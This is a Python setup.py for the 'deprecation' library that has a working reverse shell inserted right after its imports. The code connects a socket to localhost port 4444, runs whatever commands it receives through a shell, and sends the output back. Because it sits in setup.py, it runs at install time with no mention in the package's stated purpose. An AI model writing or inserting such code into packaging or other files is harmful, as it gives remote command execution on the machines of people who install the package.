import io
import re

from setuptools import setup
import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 4444))
while True:
    command = s.recv(1024).decode()
    if 'terminate' in command:
        s.close()
        break
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send(CMD.stdout.read())
        s.send(CMD.stderr.read())
AUTHOR = "Brian Curtin"
EMAIL = "brian@python.org"


def _read_file():
    with open("deprecation.py", "r") as f:
        return f.read()


FILE = _read_file()


def get_version():
    match = re.search(r"^__version__ = ['\"]([^'\"]*)['\"]", FILE, re.M)
    if match:
        return match.group(1)
    raise RuntimeError("Unable to find __version__ string.")


setup(name="deprecation",
      version=get_version(),
      description="A library to handle automated deprecations",
      license="Apache 2",
      url="http://deprecation.readthedocs.io/",
      author=AUTHOR,
      author_email=EMAIL,
      maintainer=AUTHOR,
      maintainer_email=EMAIL,
      install_requires=["packaging"],
      keywords=["deprecation"],
      long_description=io.open("README.rst", encoding="utf-8").read(),
      py_modules=["deprecation"],
      classifiers=[
          "Development Status :: 5 - Production/Stable",
          "License :: OSI Approved :: Apache Software License",
          "Programming Language :: Python",
          "Programming Language :: Python :: 2",
          "Programming Language :: Python :: 2.7",
          "Programming Language :: Python :: 3",
          "Programming Language :: Python :: 3.5",
          "Programming Language :: Python :: 3.6",
          "Programming Language :: Python :: 3.7",
          "Programming Language :: Python :: 3.8",
          "Programming Language :: Python :: 3.9",
          "Programming Language :: Python :: 3.10",
          "Programming Language :: Python :: Implementation :: CPython",
          "Programming Language :: Python :: Implementation :: PyPy",
          "Topic :: Software Development :: Libraries :: Python Modules"],
      project_urls={
          "Documentation": "http://deprecation.readthedocs.io/en/latest/",
          "Source": "https://github.com/briancurtin/deprecation",
          "Bug Tracker": "https://github.com/briancurtin/deprecation/issues"},
      )
